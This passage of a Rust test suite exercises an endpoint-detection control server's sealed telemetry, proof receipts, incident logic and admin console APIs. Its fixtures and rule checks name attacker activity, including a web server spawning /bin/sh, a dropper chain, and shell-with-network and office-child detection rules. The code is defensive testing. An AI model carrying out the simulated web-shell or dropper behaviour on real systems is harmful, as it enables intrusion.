        assert!(incident_evidence(&pool, "refused-host", "proof_invalid").await["reason"].is_string(), "{}", case);
        sqlx::query("DELETE FROM incidents WHERE incident_type = 'proof_invalid'").execute(&pool).await.unwrap();
        assert_eq!(proof_states(&pool, "refused-host").await, ["pending", "pending", "pending"], "{}", case);
        assert_eq!(count(&pool, "SELECT COUNT(*) FROM proofs WHERE agent_id = ?", "refused-host").await, 0, "{}", case);
    }

    host.agent.seq += 1;
    let not_base64 = serde_json::json!({ "agent_id": "refused-host", "session": host.agent.session, "seq": host.agent.seq, "receipt": "not base64!" }).to_string();
    assert_eq!(send_signed(&app, &host.agent, "/api/proofs", not_base64).await.0, StatusCode::UNPROCESSABLE_ENTITY);
    assert_eq!(count(&pool, "SELECT COUNT(*) FROM incidents WHERE agent_id = ? AND incident_type = 'proof_invalid'", "refused-host").await, 1);

    assert_eq!(host.prove(&app, &honest).await.0, StatusCode::OK, "after all of that, the proof the endpoint really has is taken");
    assert_eq!(proof_states(&pool, "refused-host").await, ["verified", "verified", "verified"]);
}

#[tokio::test]
async fn test_a_proof_tells_a_match_the_endpoint_did_not_release() {
    let (app, pool) = create_proving_app().await;
    let mut host = enroll_endpoint(&app, &pool, "hiding-host").await;
    let (nginx, shell) = nginx_and_its_shell();
    host.deliver(&app, &[nginx, quiet(30)]).await;
    let mut window = host.ledger.seal(&[quiet(31), shell]);
    window.releases.clear();
    assert_eq!(host.send(&app, window).await.0, StatusCode::OK);
    host.deliver(&app, &[quiet(32)]).await;
    assert!(open_incidents(&pool, "hiding-host").await.is_empty(), "until it is proven, a hidden match shows nowhere");

    let journal = host.ledger.journal(2);
    let (status, ack) = host.prove(&app, &journal).await;
    assert_eq!(status, StatusCode::OK, "the proof itself is sound: {}", ack);
    assert_eq!(open_incidents(&pool, "hiding-host").await, vec!["match_not_released"]);
    assert_eq!(
        incident_evidence(&pool, "hiding-host", "match_not_released").await,
        serde_json::json!({ "epoch": 1, "first_window": 0, "last_window": 1, "matches": [{ "trigger": 3, "rule": "server-child", "context": [0], "pid": 21, "started_at": 2 }] })
    );
    assert_eq!(proof_states(&pool, "hiding-host").await, ["mismatch", "mismatch", "pending"]);
    assert_eq!(count(&pool, "SELECT COUNT(*) FROM sealed_events WHERE agent_id = ? AND opened_at IS NOT NULL", "hiding-host").await, 0, "the server learns that a rule fired, not what the event says");

    let next = host.ledger.journal(1);
    assert_eq!(host.prove(&app, &next).await.0, StatusCode::OK, "the proofs after it still chain");
    assert_eq!(proof_states(&pool, "hiding-host").await, ["mismatch", "mismatch", "verified"]);
}

#[tokio::test]
async fn test_a_proof_tells_a_release_no_rule_stands_behind() {
    let (app, pool) = create_proving_app().await;
    let mut host = enroll_endpoint(&app, &pool, "overclaiming-host").await;
    let (nginx, shell) = nginx_and_its_shell();
    host.deliver(&app, &[nginx, quiet(30)]).await;
    let mut window = host.ledger.seal(&[quiet(31), shell]);
    window.releases.push(Release { trigger: 2, rule: "writable-image".to_string(), context: Vec::new(), pid: 31, started_at: 31, openings: vec![host.ledger.opening(2)] });
    assert_eq!(host.send(&app, window).await.0, StatusCode::OK);
    assert_eq!(open_incidents(&pool, "overclaiming-host").await, vec!["detection.server-child", "detection.writable-image"], "the release has the shape of its rule, so it is applied");

    let journal = host.ledger.journal(2);
    assert_eq!(journal.matches.len(), 1);
    assert_eq!(host.prove(&app, &journal).await.0, StatusCode::OK);
    assert_eq!(open_incidents(&pool, "overclaiming-host").await, vec!["detection.server-child", "detection.writable-image", "release_not_proven"]);
    assert_eq!(
        incident_evidence(&pool, "overclaiming-host", "release_not_proven").await,
        serde_json::json!({ "epoch": 1, "first_window": 0, "last_window": 1, "releases": [{ "trigger": 2, "rule": "writable-image", "context": [], "pid": 31, "started_at": 31 }] })
    );
    assert_eq!(proof_states(&pool, "overclaiming-host").await, ["mismatch", "mismatch"]);

    let proven: Vec<(String, bool)> = sqlx::query_as("SELECT rule, proven FROM releases WHERE agent_id = 'overclaiming-host' ORDER BY rule").fetch_all(&pool).await.unwrap();
    assert_eq!(proven, [("server-child".to_string(), true), ("writable-image".to_string(), false)], "the release the proof does tell is proven all the same");
    let told: Vec<(String, String)> = findings(&pool, "overclaiming-host").await.iter().map(|finding| (finding["rule"].as_str().unwrap().to_string(), finding["proof"].as_str().unwrap().to_string())).collect();
    assert_eq!(told, [("server-child".to_string(), "verified".to_string()), ("writable-image".to_string(), "pending".to_string())]);
}

#[tokio::test]
async fn test_an_endpoint_that_stops_proving_opens_an_incident() {
    let (app, pool) = create_proving_app().await;
    let mut host = enroll_endpoint(&app, &pool, "stopped-proving-host").await;
    host.deliver(&app, &[quiet(30)]).await;
    assert!(open_incidents(&pool, "stopped-proving-host").await.is_empty());

    for pid in [31, 32] {
        let mut window = host.ledger.seal(&[quiet(pid)]);
        window.proving = false;
        assert_eq!(host.send(&app, window).await.0, StatusCode::OK, "the window is held all the same");
    }
    assert_eq!(open_incidents(&pool, "stopped-proving-host").await, vec!["proving_stopped"]);
    assert_eq!(incident_evidence(&pool, "stopped-proving-host", "proving_stopped").await, serde_json::json!({ "window": 1, "epoch": 1 }));
    assert_eq!(proof_states(&pool, "stopped-proving-host").await, ["pending", "none", "none"]);

    let mut never = enroll_endpoint(&app, &pool, "never-proving-host").await;
    for pid in [30, 31] {
        let mut window = never.ledger.seal(&[quiet(pid)]);
        window.proving = false;
        assert_eq!(never.send(&app, window).await.0, StatusCode::OK);
    }
    assert!(open_incidents(&pool, "never-proving-host").await.is_empty(), "an endpoint that was installed without a prover is no incident");
}

#[tokio::test]
async fn test_windows_of_an_endpoint_without_a_prover_wait_for_no_proof_and_take_none() {
    let (app, pool) = create_proving_app().await;
    let mut host = enroll_endpoint(&app, &pool, "unproving-host").await;
    let (nginx, shell) = nginx_and_its_shell();
    for events in [vec![nginx, quiet(30)], vec![quiet(31), shell]] {
        let mut window = host.ledger.seal(&events);
        window.proving = false;
        assert_eq!(host.send(&app, window).await.0, StatusCode::OK);
    }
    assert_eq!(proof_states(&pool, "unproving-host").await, ["none", "none"]);
    assert_eq!(findings(&pool, "unproving-host").await.len(), 1, "its findings are taken as they come");

    let journal = host.ledger.journal(2);
    assert_eq!(host.prove(&app, &journal).await.0, StatusCode::UNPROCESSABLE_ENTITY);
    assert_eq!(open_incidents(&pool, "unproving-host").await, vec!["detection.server-child", "proof_invalid"]);
    assert_eq!(proof_states(&pool, "unproving-host").await, ["none", "none"]);
}

#[tokio::test]
async fn test_proofs_require_a_valid_signature_and_a_receipt_of_an_accepted_program() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut host = enroll_endpoint(&app, &pool, "receipt-host").await;
    host.deliver(&app, &[quiet(1)]).await;
    let journal = host.ledger.journal(1);

    let body = serde_json::json!({ "agent_id": "receipt-host", "session": host.agent.session, "seq": host.agent.seq + 1, "receipt": bytes_to_base64(&journal.to_bytes()) }).to_string();
    assert_eq!(post_agent(&app, "/api/proofs", body.clone(), None).await.0, StatusCode::UNAUTHORIZED);
    let impostor = TestAgent::new("receipt-host");
    assert_eq!(send_signed(&app, &impostor, "/api/proofs", body).await.0, StatusCode::UNAUTHORIZED);
    assert!(open_incidents(&pool, "receipt-host").await.is_empty());

    let (status, answer) = host.prove(&app, &journal).await;
    assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY, "a journal alone is no receipt: {}", answer);
    assert_eq!(open_incidents(&pool, "receipt-host").await, vec!["proof_invalid"]);
    assert_eq!(proof_states(&pool, "receipt-host").await, ["pending"]);

    let (status, _) = post_agent(&app, "/api/proofs", "{ not a proof".to_string(), Some("00")).await;
    assert_eq!(status, StatusCode::BAD_REQUEST);

    let megabytes = vec![7u8; 4 * 1024 * 1024];
    let (status, answer) = host.submit(&app, &megabytes).await;
    assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY, "a receipt of several megabytes is read and judged: {}", answer);
    let too_large = serde_json::json!({ "agent_id": "receipt-host", "session": host.agent.session, "seq": host.agent.seq + 1, "receipt": "x".repeat(zedr_control_server::api::ingestion::proofs::MAX_PROOF_BYTES) });
    assert_eq!(send_signed(&app, &host.agent, "/api/proofs", too_large.to_string()).await.0, StatusCode::PAYLOAD_TOO_LARGE);
}

#[tokio::test]
async fn test_a_proof_that_is_overdue_opens_one_incident_for_an_agent_that_is_alive() {
    let (app, pool) = create_proving_app().await;
    let mut waiting = enroll_endpoint(&app, &pool, "overdue-host").await;
    let mut asleep = enroll_endpoint(&app, &pool, "asleep-host").await;
    let mut unproving = enroll_endpoint(&app, &pool, "no-prover-host").await;
    let mut prompt = enroll_endpoint(&app, &pool, "prompt-host").await;

    waiting.deliver(&app, &[quiet(1)]).await;
    waiting.deliver(&app, &[quiet(2)]).await;
    asleep.deliver(&app, &[quiet(1)]).await;
    sqlx::query("UPDATE agents SET liveness_state = 'stale' WHERE id = 'asleep-host'").execute(&pool).await.unwrap();
    let mut window = unproving.ledger.seal(&[quiet(1)]);
    window.proving = false;
    assert_eq!(unproving.send(&app, window).await.0, StatusCode::OK);
    prompt.deliver(&app, &[quiet(1)]).await;
    let journal = prompt.ledger.journal(1);
    assert_eq!(prompt.prove(&app, &journal).await.0, StatusCode::OK);

    let (events_tx, _) = tokio::sync::broadcast::channel(16);
    let received = count(&pool, "SELECT MIN(received_at) FROM sealed_windows WHERE agent_id = ?", "overdue-host").await;
    let sweep = |now: i64, deadline: i64| {
        let (pool, events_tx) = (pool.clone(), events_tx.clone());
        async move { zedr_control_server::proofs::sweep_once(&pool, &events_tx, now, deadline).await.unwrap() }
    };

    sweep(received + 3600, 3600).await;
    assert!(open_incidents(&pool, "overdue-host").await.is_empty(), "an hour is allowed");

    sweep(received + 3601, 3600).await;
    assert_eq!(open_incidents(&pool, "overdue-host").await, vec!["proof_overdue"]);
    let evidence = incident_evidence(&pool, "overdue-host", "proof_overdue").await;
    assert_eq!((evidence["window"].as_i64(), evidence["waiting_secs"].as_i64(), evidence["received_at"].as_i64()), (Some(0), Some(3601), Some(received)));

    sweep(received + 9000, 3600).await;
    assert_eq!(count(&pool, "SELECT COUNT(*) FROM incidents WHERE agent_id = ?", "overdue-host").await, 1, "a proof that stays overdue is one incident, not one per sweep");
    for agent_id in ["asleep-host", "no-prover-host", "prompt-host"] {
        assert!(open_incidents(&pool, agent_id).await.is_empty(), "{} owes no proof now", agent_id);
    }

    sweep(received + 100, 60).await;
    assert!(open_incidents(&pool, "asleep-host").await.is_empty(), "the deadline can be set, and an endpoint that is not alive is still not asked");
}

#[tokio::test]
async fn test_the_console_reads_the_chain_of_an_agent() {
    let (app, pool) = create_proving_app().await;
    let mut host = enroll_endpoint(&app, &pool, "chain-host").await;
    enroll_endpoint(&app, &pool, "empty-host").await;
    tell_a_story(&app, &mut host).await;
    let window = host.ledger.seal_marked(&[quiet(33)], true);
    assert_eq!(host.send(&app, window).await.0, StatusCode::OK);
    let reader = admin_token("user");

    let (status, chain) = call(&app, "GET", "/api/admin/agents/chain-host/chain", Some(&reader), None).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(
        (chain["epoch"].as_u64(), chain["next_window"].as_u64(), chain["next_index"].as_u64(), chain["head"].as_str(), chain["proven_window"].is_null()),
        (Some(1), Some(4), Some(6), Some(hash_to_hex(&host.ledger.head).as_str()), true)
    );
    assert_eq!(chain["totals"], serde_json::json!({ "windows": 4, "events": 6, "opened": 2, "gaps": 1 }));
    let windows = chain["windows"].as_array().unwrap();
    assert_eq!(windows.iter().map(|window| window["window"].as_u64().unwrap()).collect::<Vec<_>>(), [3, 2, 1, 0], "newest first");
    let received_at = windows[2]["received_at"].as_i64().unwrap();
    assert!((chrono::Utc::now().timestamp() - received_at).abs() < 60);
    assert_eq!(
        windows[2],
        serde_json::json!({ "window": 1, "epoch": 1, "first_index": 2, "count": 2, "opened": 1, "fresh": false, "gap": false, "received_at": received_at, "proof": "pending" })
    );
    assert_eq!((&windows[3]["fresh"], &windows[3]["opened"], &windows[0]["gap"], &windows[0]["opened"]), (&serde_json::json!(true), &serde_json::json!(1), &serde_json::json!(true), &serde_json::json!(0)));

    let journal = host.ledger.journal(2);
    assert_eq!(host.prove(&app, &journal).await.0, StatusCode::OK);
    let (_, chain) = call(&app, "GET", "/api/admin/agents/chain-host/chain?limit=3", Some(&reader), None).await;
    assert_eq!(chain["proven_window"], 1);
    let proofs: Vec<&str> = chain["windows"].as_array().unwrap().iter().map(|window| window["proof"].as_str().unwrap()).collect();
    assert_eq!(proofs, ["pending", "pending", "verified"], "the limit cuts the oldest windows off");
    let (_, chain) = call(&app, "GET", "/api/admin/agents/chain-host/chain?limit=100000", Some(&reader), None).await;
    assert_eq!(chain["windows"].as_array().unwrap().len(), 4);

    let (status, empty) = call(&app, "GET", "/api/admin/agents/empty-host/chain", Some(&reader), None).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(
        empty,
        serde_json::json!({
            "epoch": 0, "next_window": 0, "next_index": 0, "head": hash_to_hex(&GENESIS), "proven_window": null,
            "totals": { "windows": 0, "events": 0, "opened": 0, "gaps": 0 }, "windows": []
        })
    );

    assert_eq!(call(&app, "GET", "/api/admin/agents/no-such-host/chain", Some(&reader), None).await.0, StatusCode::NOT_FOUND);
    assert_eq!(call(&app, "GET", "/api/admin/agents/chain-host/chain", None, None).await.0, StatusCode::UNAUTHORIZED);
}

#[tokio::test]
async fn test_the_console_reads_what_the_server_holds_of_all_chains_together() {
    let (app, pool) = create_proving_app().await;
    let reader = admin_token("user");
    let (status, nothing) = call(&app, "GET", "/api/admin/chain/summary", Some(&reader), None).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(nothing, serde_json::json!({ "agents": 0, "windows": 0, "events": 0, "opened": 0, "gaps": 0, "proofs": { "pending": 0, "verified": 0, "mismatch": 0, "none": 0 } }));

    let mut proving = enroll_endpoint(&app, &pool, "summary-proving").await;
    tell_a_story(&app, &mut proving).await;
    let journal = proving.ledger.journal(2);
    assert_eq!(proving.prove(&app, &journal).await.0, StatusCode::OK);

    let mut hiding = enroll_endpoint(&app, &pool, "summary-hiding").await;
    let (nginx, shell) = nginx_and_its_shell();
    let mut window = hiding.ledger.seal(&[nginx, shell]);
    window.releases.clear();
    assert_eq!(hiding.send(&app, window).await.0, StatusCode::OK);
    let journal = hiding.ledger.journal(1);
    assert_eq!(hiding.prove(&app, &journal).await.0, StatusCode::OK);

    let mut unproving = enroll_endpoint(&app, &pool, "summary-unproving").await;
    for (events, gap) in [(vec![quiet(1), quiet(2)], false), (vec![quiet(3)], true)] {
        let mut window = unproving.ledger.seal_marked(&events, gap);
        window.proving = false;
        assert_eq!(unproving.send(&app, window).await.0, StatusCode::OK);
    }

    let mut refused = enroll_endpoint(&app, &pool, "summary-refused").await;
    let mut window = refused.ledger.seal(&[quiet(1)]);
    window.events.clear();
    assert_eq!(refused.send(&app, window).await.0, StatusCode::UNPROCESSABLE_ENTITY);
    enroll_endpoint(&app, &pool, "summary-silent").await;

    let (status, summary) = call(&app, "GET", "/api/admin/chain/summary", Some(&reader), None).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(
        summary,
        serde_json::json!({ "agents": 3, "windows": 6, "events": 10, "opened": 2, "gaps": 1, "proofs": { "pending": 1, "verified": 2, "mismatch": 1, "none": 2 } }),
        "an agent the server holds no window of is not counted"
    );
    let by_status: Vec<(String, i64)> = sqlx::query_as("SELECT proof, COUNT(*) FROM sealed_windows GROUP BY proof ORDER BY proof").fetch_all(&pool).await.unwrap();
    assert_eq!(by_status, [("mismatch".to_string(), 1), ("none".to_string(), 2), ("pending".to_string(), 1), ("verified".to_string(), 2)]);

    assert_eq!(call(&app, "GET", "/api/admin/chain/summary", None, None).await.0, StatusCode::UNAUTHORIZED);
}

#[tokio::test]
async fn test_a_live_stream_says_it_is_open_before_anything_happens() {
    use futures::StreamExt;
    let app = create_test_app().await;
    let token = admin_token("user");

    for stream in ["/api/admin/events/stream", "/api/admin/agents/stream"] {
        let request = Request::builder().uri(format!("{}?token={}", stream, token)).body(Body::empty()).unwrap();
        let response = app.clone().oneshot(request).await.unwrap();
        assert_eq!(response.status(), StatusCode::OK, "{}", stream);
        let mut body = response.into_body().into_data_stream();
        let first = tokio::time::timeout(std::time::Duration::from_secs(2), body.next()).await.expect("a quiet stream still sends its first bytes at once");
        assert_eq!(first.unwrap().unwrap().as_ref(), b": open\n\n", "{}", stream);
    }
}

#[tokio::test]
async fn test_the_console_reads_the_committed_events_of_an_agent_newest_first_and_only_the_opened_in_the_clear() {
    let (app, pool) = create_proving_app().await;
    let mut host = enroll_endpoint(&app, &pool, "sealed-host").await;
    tell_a_story(&app, &mut host).await;
    let reader = admin_token("user");

    let (status, listed) = call(&app, "GET", "/api/admin/agents/sealed-host/sealed", Some(&reader), None).await;
    assert_eq!(status, StatusCode::OK);
    let rows = listed.as_array().unwrap();
    assert_eq!(rows.iter().map(|row| (row["index"].as_i64().unwrap(), row["window"].as_i64().unwrap(), row["opened"].as_bool().unwrap())).collect::<Vec<_>>(), [(4, 2, false), (3, 1, true), (2, 1, false), (1, 0, false), (0, 0, true)]);

    let leaf: String = sqlx::query_scalar("SELECT leaf FROM sealed_events WHERE agent_id = 'sealed-host' AND idx = 2").fetch_one(&pool).await.unwrap();
    assert_eq!(
        rows[2],
        serde_json::json!({ "index": 2, "window": 1, "epoch": 1, "received_at": rows[2]["received_at"], "leaf": leaf, "ciphertext_bytes": 272, "proof": "pending", "opened": false }),
        "of a sealed event the server tells where it sits, its commitment and its size, and nothing else"
    );
    assert!(rows[2]["received_at"].is_i64());

    let opened_as: String = sqlx::query_scalar("SELECT id FROM events WHERE agent_id = 'sealed-host' AND event_type = 'process' AND data LIKE '%/bin/sh%'").fetch_one(&pool).await.unwrap();
    assert_eq!((&rows[1]["event_id"], &rows[1]["event_type"]), (&serde_json::json!(opened_as), &serde_json::json!("process")));
    assert_eq!(serde_json::from_str::<serde_json::Value>(rows[1]["data"].as_str().unwrap()).unwrap(), stored_form(&nginx_and_its_shell().1));
    assert!(rows[4]["data"].as_str().unwrap().contains("/usr/sbin/nginx"), "the parent the finding opened");
    assert!(!listed.to_string().contains("sleep"), "what no rule opened is in no answer");

    let (_, page) = call(&app, "GET", "/api/admin/agents/sealed-host/sealed?before=3&limit=2", Some(&reader), None).await;
    assert_eq!(page.as_array().unwrap().iter().map(|row| row["index"].as_i64().unwrap()).collect::<Vec<_>>(), [2, 1]);
    let (_, none) = call(&app, "GET", "/api/admin/agents/sealed-host/sealed?before=0", Some(&reader), None).await;
    assert_eq!(none, serde_json::json!([]));

    assert_eq!(call(&app, "GET", "/api/admin/agents/nobody/sealed", Some(&reader), None).await.0, StatusCode::NOT_FOUND);
    assert_eq!(call(&app, "GET", "/api/admin/agents/sealed-host/sealed", None, None).await.0, StatusCode::UNAUTHORIZED);
}

#[tokio::test]
async fn test_the_console_reads_one_window_with_its_sealed_events_and_releases() {
    let (app, pool) = create_proving_app().await;
    let mut host = enroll_endpoint(&app, &pool, "window-host").await;
    tell_a_story(&app, &mut host).await;
    let reader = admin_token("user");
    let sealed = &host.ledger.kept[1].0;

    let (status, window) = call(&app, "GET", "/api/admin/agents/window-host/windows/1", Some(&reader), None).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(
        window["header"],
        serde_json::json!({
            "epoch": 1, "window": 1, "first_index": 2, "count": 2, "fresh": false, "gap": false,
            "prev_head": hash_to_hex(&sealed.prev_head), "root": hash_to_hex(&sealed.root), "head": hash_to_hex(&sealed.head),
        })
    );
    assert_eq!((&window["proving"], &window["proof"], window["received_at"].is_i64()), (&serde_json::json!(true), &serde_json::json!("pending"), true));

    let opened_as: String = sqlx::query_scalar("SELECT id FROM events WHERE agent_id = 'window-host' AND event_type = 'process' AND data LIKE '%/bin/sh%'").fetch_one(&pool).await.unwrap();
    let events = window["events"].as_array().unwrap();
    assert_eq!(events.len(), 2);
    assert_eq!(events[0], serde_json::json!({ "index": 2, "leaf": events[0]["leaf"], "ciphertext_bytes": 272, "opened": false }));
    assert_eq!(events[1], serde_json::json!({ "index": 3, "leaf": events[1]["leaf"], "ciphertext_bytes": 272, "opened": true, "event_id": opened_as }));
    assert!(events.iter().all(|event| event["leaf"].as_str().is_some_and(|leaf| leaf.len() == 64)));
    assert_eq!(
        window["releases"],
        serde_json::json!([{ "trigger": 3, "rule": "server-child", "title": "Server process started a shell", "technique": "T1505.003", "level": "high", "context": [0], "proven": false }])
    );

    let journal = host.ledger.journal(3);
    assert_eq!(host.prove(&app, &journal).await.0, StatusCode::OK);
    let (_, window) = call(&app, "GET", "/api/admin/agents/window-host/windows/1", Some(&reader), None).await;
    assert_eq!((&window["proof"], &window["releases"][0]["proven"]), (&serde_json::json!("verified"), &serde_json::json!(true)));
    let (_, quiet_window) = call(&app, "GET", "/api/admin/agents/window-host/windows/2", Some(&reader), None).await;
    assert_eq!((quiet_window["events"].as_array().unwrap().len(), quiet_window["releases"].as_array().unwrap().len()), (1, 0));

    for missing in ["/api/admin/agents/window-host/windows/3", "/api/admin/agents/no-such-host/windows/0"] {
        assert_eq!(call(&app, "GET", missing, Some(&reader), None).await.0, StatusCode::NOT_FOUND);
    }
    assert_eq!(call(&app, "GET", "/api/admin/agents/window-host/windows/1", None, None).await.0, StatusCode::UNAUTHORIZED);
}

#[tokio::test]
async fn test_the_console_reads_the_rules_and_the_proof_programs_the_server_accepts() {
    let (app, pool) = create_proving_app().await;
    let mut host = enroll_endpoint(&app, &pool, "ruleset-host").await;
    host.deliver(&app, &dropper_chain()).await;
    let reader = admin_token("user");

    let (status, ruleset) = call(&app, "GET", "/api/admin/ruleset", Some(&reader), None).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(ruleset["image_ids"], serde_json::json!([hash_to_hex(&TEST_IMAGE_ID)]));
    let rules = ruleset["rules"].as_array().unwrap();
    assert_eq!(rules.len(), zedr_rules::RuleId::ALL.len());
    let rule = |id: &str| rules.iter().find(|rule| rule["id"] == id).unwrap();
    assert_eq!(
        rule("office-child"),
        &serde_json::json!({ "id": "office-child", "title": "Office application started a script host", "technique": "T1204.002", "level": "high", "opens": "process and parent", "releases": 1 })
    );
    assert_eq!((&rule("shell-network")["opens"], &rule("shell-network")["level"], &rule("shell-network")["releases"]), (&serde_json::json!("event, process and parent"), &serde_json::json!("medium"), &serde_json::json!(1)));
    assert_eq!((&rule("root-key-added")["opens"], &rule("root-key-added")["releases"]), (&serde_json::json!("autostart item"), &serde_json::json!(0)));
    assert_eq!(
        rule("flagged-process-ended"),
        &serde_json::json!({ "id": "flagged-process-ended", "title": "Process with a finding ended", "technique": "", "level": "info", "opens": "end of the process and the process", "releases": 0 }),
        "a rule that only follows up on a finding has no technique"
    );
    assert_eq!(rules.iter().map(|rule| rule["releases"].as_i64().unwrap()).sum::<i64>(), 7);

    let (default_app, _) = create_test_app_with_pool().await;
    let (_, from_env) = call(&default_app, "GET", "/api/admin/ruleset", Some(&reader), None).await;
    assert_eq!(from_env["image_ids"], serde_json::json!([TEST_GUEST_IMAGE_ID]), "a deployment names the programs it accepts in ZEDR_GUEST_IMAGE_IDS");
    assert_eq!((&ruleset["stand_in"], &from_env["stand_in"]), (&serde_json::json!(false), &serde_json::json!(false)), "a server that verifies says so");
    assert_eq!(call(&app, "GET", "/api/admin/ruleset", None, None).await.0, StatusCode::UNAUTHORIZED);

    struct Stated;
    impl ReceiptVerifier for Stated {
        fn verify(&self, receipt: &[u8]) -> Result<Verified, String> {
            Ok(Verified { image_id: [0u8; 32], journal: receipt.to_vec() })
        }
        fn image_ids(&self) -> Vec<Hash> {
            Vec::new()
        }
        fn stands_in(&self) -> bool {
            true
        }
    }
    let options = zedr_control_server::api::RouterOptions { receipt_verifier: Some(Arc::new(Stated)), ..Default::default() };
    let tenant = zedr_control_server::api::create_router_with_options(create_test_db().await, options);
    let (_, told) = call(&tenant, "GET", "/api/admin/ruleset", Some(&reader), None).await;
    assert_eq!((&told["stand_in"], &told["image_ids"]), (&serde_json::json!(true), &serde_json::json!([])), "a test tenant tells the console that its proofs prove nothing");
}

#[tokio::test]
async fn test_the_api_document_describes_the_sealed_telemetry_endpoints() {
    let app = create_test_app().await;
    let (status, document) = call(&app, "GET", "/api-docs/openapi.json", None, None).await;
    assert_eq!(status, StatusCode::OK);

    for path in ["/api/windows", "/api/proofs", "/api/admin/agents/{id}/chain", "/api/admin/agents/{id}/windows/{window}", "/api/admin/agents/{id}/sealed", "/api/admin/chain/summary", "/api/admin/ruleset"] {
        assert!(document["paths"][path].is_object(), "{} is documented", path);
    }
    for schema in ["SealedWindow", "Release", "SealedWindowAck", "WindowRefusal", "ProofSubmission", "ProofAck", "ChainView", "WindowSummary", "ChainSummary", "ProofCounts", "WindowView", "SealedEventView", "ReleaseView", "RulesetView", "RuleView"] {
        assert!(document["components"]["schemas"][schema].is_object(), "{} is described", schema);
    }
    for status in ["409", "422"] {
        let refused = &document["paths"]["/api/windows"]["post"]["responses"][status]["content"]["application/json"]["schema"]["$ref"];
        assert_eq!(refused, "#/components/schemas/WindowRefusal", "an agent can tell what a window refused with {} is answered with", status);
    }
    assert!(document["components"]["schemas"]["ChainPosition"].is_null());
}
